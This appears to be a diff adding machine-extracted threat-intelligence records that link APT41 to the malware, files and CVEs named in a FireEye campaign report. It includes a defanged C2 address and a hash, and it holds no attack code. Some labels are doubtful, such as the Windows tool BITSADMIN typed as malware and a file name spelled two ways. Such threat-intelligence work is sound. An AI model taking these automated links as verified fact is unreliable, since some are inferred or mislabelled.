+          "ev_102"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "malicious_component",
+        "family_hints": [
+          "BEACON",
+          "HTTP"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0006",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_file_storescyncsvc.dll",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_28",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_28",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_28"
+      },
+      "head": {
+        "id": "ent_malware_BEACON",
+        "type": "Malware",
+        "name": "BEACON",
+        "normalized_name": "BEACON",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_27",
+          "ev_28",
+          "ev_29",
+          "ev_31"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "family": "BEACON",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_27",
+        "supporting_evidence_ids": [
+          "ev_29",
+          "ev_28",
+          "ev_31"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_storescyncsvc.dll",
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "type": "File",
+        "name": "storescyncsvc.dll",
+        "normalized_name": "storescyncsvc.dll",
+        "aliases": [],
+        "confidence": 0.83,
+        "evidence_ids": [
+          "ev_28"
+        ],
+        "sources": [
+          "event_derive"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact",
+        "file_name": "storescyncsvc.dll",
+        "file_role": "file_artifact"
+      }
+    },
+    {
+      "id": "rel_0007",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_BITSADMIN",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_24"
+      ],
+      "primary_evidence_id": "ev_24",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "event_download, download_event; download_head",
+        "schema_version": "v4.0-event-refiner",
+        "evidence_span": "In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345."
+      }
+    },
+    {
+      "id": "rel_0008",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "event_download, download_event; report_download_support",
+        "schema_version": "v4.0-event-refiner",
+        "evidence_span": "ev_22"
+      }
+    },
+    {
+      "id": "rel_0009",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_logger.zip",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_22"
+      },
+      "head": {
+        "id": "ent_malware_Storesyncsvc",
+        "type": "Malware",
+        "name": "Storesyncsvc",
+        "normalized_name": "Storesyncsvc",
+        "aliases": [
+          "storesyncsvc.dll"
+        ],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "sources": [
+          "derived",
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "family_hints": [
+          "BEACON"
+        ],
+        "derived_from_file_id": "ent_file_storesyncsvc.dll",
+        "family": "Storesyncsvc",
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_logger.zip",
+        "type": "File",
+        "name": "logger.zip",
+        "normalized_name": "logger.zip",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_22",
+          "ev_79",
+          "ev_81"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "logger.zip",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_81",
+        "supporting_evidence_ids": [
+          "ev_22",
+          "ev_79"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0010",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_VMProtected_Meterpreter",
+      "tail_id": "ent_file_2.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_29",
+        "ev_100",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_29",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_29"
+      },
+      "head": {
+        "id": "ent_malware_VMProtected_Meterpreter",
+        "type": "Malware",
+        "name": "VMProtected Meterpreter",
+        "normalized_name": "VMProtected Meterpreter",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_29"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "family": "VMProtected Meterpreter",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_29",
+        "supporting_evidence_ids": [],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_2.exe",
+        "type": "File",
+        "name": "2.exe",
+        "normalized_name": "2.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_101",
+          "ev_102",
+          "ev_28",
+          "ev_29"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "2.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_101",
+        "supporting_evidence_ids": [
+          "ev_28",
+          "ev_29",
+          "ev_102"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "malicious_component",
+        "family_hints": [
+          "BEACON",
+          "HTTP"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0011",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_VMProtected_Meterpreter",
+      "tail_id": "ent_file_storescyncsvc.dll",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_101",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_101"
+      },
+      "head": {
+        "id": "ent_malware_VMProtected_Meterpreter",
+        "type": "Malware",
+        "name": "VMProtected Meterpreter",
+        "normalized_name": "VMProtected Meterpreter",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_29"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "family": "VMProtected Meterpreter",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_29",
+        "supporting_evidence_ids": [],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_storescyncsvc.dll",
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "type": "File",
+        "name": "storescyncsvc.dll",
+        "normalized_name": "storescyncsvc.dll",
+        "aliases": [],
+        "confidence": 0.83,
+        "evidence_ids": [
+          "ev_28"
+        ],
+        "sources": [
+          "event_derive"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact",
+        "file_name": "storescyncsvc.dll",
+        "file_role": "file_artifact"
+      }
+    },
+    {
+      "id": "rel_0012",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_file_2.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_29",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_29",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0013",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_file_storescyncsvc.dll",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_28",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_28",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0014",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_logger.zip",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0015",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_VMProtected_Meterpreter",
+      "tail_id": "ent_file_2.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_100",
+        "ev_29",
+        "ev_99",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_100",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0016",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "drops",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_89"
+      ],
+      "primary_evidence_id": "ev_89",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_89"
+      },
+      "head": {
+        "id": "ent_malware_BEACON",
+        "type": "Malware",
+        "name": "BEACON",
+        "normalized_name": "BEACON",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_27",
+          "ev_28",
+          "ev_29",
+          "ev_31"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "family": "BEACON",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_27",
+        "supporting_evidence_ids": [
+          "ev_29",
+          "ev_28",
+          "ev_31"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_install.bat",
+        "type": "File",
+        "name": "install.bat",
+        "normalized_name": "install.bat",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "install.bat",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "offensive_tool_or_utility",
+        "family_hints": [
+          "BEACON"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0017",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "drops",
+      "head_id": "ent_malware_BITSADMIN",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_24"
+      ],
+      "primary_evidence_id": "ev_24",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_24"
+      },
+      "head": {
+        "id": "ent_malware_BITSADMIN",
+        "type": "Malware",
+        "name": "BITSADMIN",
+        "normalized_name": "BITSADMIN",
+        "aliases": [
+          "BITSADMIN.EXE"
+        ],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_119",
+          "ev_121",
+          "ev_43"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "sources": [
+          "derived",
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_119",
+        "supporting_evidence_ids": [
+          "ev_121",
+          "ev_43"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "family_hints": [
+          "BITSADMIN",
+          "MULTISTAGE",
+          "DOWNLOADER",
+          "METHODOLOGY"
+        ],
+        "derived_from_file_id": "ent_file_BITSADMIN.EXE",
+        "family": "BITSADMIN",
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_install.bat",
+        "type": "File",
+        "name": "install.bat",
+        "normalized_name": "install.bat",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "install.bat",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "offensive_tool_or_utility",
+        "family_hints": [
+          "BEACON"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0018",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "drops",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_41"
+      ],
+      "primary_evidence_id": "ev_21",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_21"
+      },
+      "head": {
+        "id": "ent_malware_Storesyncsvc",
+        "type": "Malware",
+        "name": "Storesyncsvc",
+        "normalized_name": "Storesyncsvc",
+        "aliases": [
+          "storesyncsvc.dll"
+        ],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "sources": [
+          "derived",
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "family_hints": [
+          "BEACON"
+        ],
+        "derived_from_file_id": "ent_file_storesyncsvc.dll",
+        "family": "Storesyncsvc",
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_install.bat",
+        "type": "File",
+        "name": "install.bat",
+        "normalized_name": "install.bat",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "install.bat",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "offensive_tool_or_utility",
+        "family_hints": [
+          "BEACON"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0019",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "drops",
+      "head_id": "ent_malware_Storesyncsvc",
+      "tail_id": "ent_file_logger.zip",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_22"
+      },
+      "head": {
+        "id": "ent_malware_Storesyncsvc",
+        "type": "Malware",
+        "name": "Storesyncsvc",
+        "normalized_name": "Storesyncsvc",
+        "aliases": [
+          "storesyncsvc.dll"
+        ],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "sources": [
+          "derived",
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "family_hints": [
+          "BEACON"
+        ],
+        "derived_from_file_id": "ent_file_storesyncsvc.dll",
+        "family": "Storesyncsvc",
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_logger.zip",
+        "type": "File",
+        "name": "logger.zip",
+        "normalized_name": "logger.zip",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_22",
+          "ev_79",
+          "ev_81"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "logger.zip",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_81",
+        "supporting_evidence_ids": [
+          "ev_22",
+          "ev_79"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0020",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "executes",
+      "head_id": "ent_file_logger.zip",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0021",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2019-1652",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_73",
+        "ev_15",
+        "ev_16"
+      ],
+      "primary_evidence_id": "ev_73",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploited",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "title_exploit, evidence_exploit; report_exploit_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_73"
+      }
+    },
+    {
+      "id": "rel_0022",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2019-1653",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_73",
+        "ev_15",
+        "ev_16"
+      ],
+      "primary_evidence_id": "ev_73",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploited",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "title_exploit, evidence_exploit; report_exploit_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_73"
+      }
+    },
+    {
+      "id": "rel_0023",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2019-19781",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_63",
+        "ev_62",
+        "ev_47",
+        "ev_48",
+        "ev_123",
+        "ev_124",
+        "ev_125",
+        "ev_126",
+        "ev_67"
+      ],
+      "primary_evidence_id": "ev_63",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploit",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "event_exploit, evidence_exploit; report_exploit_support",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "ev_63"
+      }
+    },
+    {
+      "id": "rel_0024",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2019-3396",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_38",
+        "ev_37"
+      ],
+      "primary_evidence_id": "ev_38",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "leverage",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "event_exploit, evidence_exploit; exploit_head",
+        "schema_version": "v2.0-evidence",
+        "evidence_span": "Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S."
+      }
+    },
+    {
+      "id": "rel_0025",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2020-10189",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_18",
+        "ev_77",
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_18",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "use",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "evidence_exploit",
+        "schema_version": "v2.0-evidence"
+      }
+    },
+    {
+      "id": "rel_0026",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "exploits",
+      "head_id": "ent_threatactor_APT41",
+      "tail_id": "ent_cve_CVE-2020-10198",
+      "head_type": "ThreatActor",
+      "tail_type": "CVE",
+      "confidence": 0.87,
+      "evidence_ids": [
+        "ev_46",
+        "ev_47"
+      ],
+      "primary_evidence_id": "ev_46",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "exploits",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "initial_access",
+        "notes": "evidence_exploit",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0027",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "loads",
+      "head_id": "ent_file_logger.zip",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0028",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "loads",
+      "head_id": "ent_file_logger.zip",
+      "tail_id": "ent_malware_Storesyncsvc",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_22",
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0029",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "loads",
+      "head_id": "ent_file_svchost.exe",
+      "tail_id": "ent_malware_BEACON",
+      "head_type": "File",
+      "tail_type": "Malware",
